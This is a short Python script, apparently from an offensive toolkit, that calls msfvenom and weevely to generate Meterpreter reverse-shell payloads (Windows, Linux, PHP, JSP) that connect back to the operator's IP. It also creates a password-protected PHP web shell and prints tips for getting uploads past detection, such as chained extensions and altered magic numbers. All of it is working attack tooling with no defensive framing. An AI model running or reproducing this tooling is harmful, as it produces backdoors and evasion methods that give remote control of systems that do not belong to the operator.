import os
import sys
import platform as p
from utils.nTools import get_ip

PASSWORD = "mult"
PATH = "~/Mult/"
FILENAME = "Mult"
OS = ""
HOST = ""
PORT = "45678"
OS_WINDOWS = "windows/x64/meterpreter/reverse_tcp"
OS_LINUX = "linux/x64/meterpreter/reverse_tcp"
PHP = "php/meterpreter_reverse_tcp"
JSP = "ava/jsp_shell_reverse_tcp"
EXTENTION = ""

# git clone https://github.com/epinna/weevely3
def weevely():
    print("Generating web shell please wait...")
    os.system(f"weevely generate {PASSWORD} {PATH + FILENAME}.php")
    # Use this command to download weevely
    print('''Feel free to change the extension of the file.
        Default: php
        Some methods to evade detection
        [+] Try chaining the extensions shell.php.jpg 
        [+] Change the extension in burp while intercepting.
        [+] Change Magic number to evade detection''')

def msfvenom(op_sys):
    global FILENAME, HOST, OS, EXTENTION
    HOST = get_ip()
    print("Generating shell please wait...")
    if op_sys == "WIN":
        OS = OS_WINDOWS
        EXTENTION = "exe"
        FILENAME = FILENAME + "-shell-x64." + EXTENTION
    elif op_sys == "LIN":
        OS = OS_LINUX
        EXTENTION = "elf"
        FILENAME = FILENAME + "-shell-x64."+ EXTENTION
    elif op_sys == "PHP":
        OS = PHP
        EXTENTION = "php"
        FILENAME = FILENAME + "-wShell." + EXTENTION
    elif op_sys == "JSP":
        OS = JSP
        EXTENTION = "jsp"
        FILENAME = FILENAME + "-wShell." + EXTENTION    
    os.system(f"msfvenom -p {OS} LHOST={HOST} LPORT={PORT} -f {EXTENTION} > {PATH + FILENAME}")
    print(f"Path: {PATH + FILENAME}")

msfvenom('LIN')
# weevely()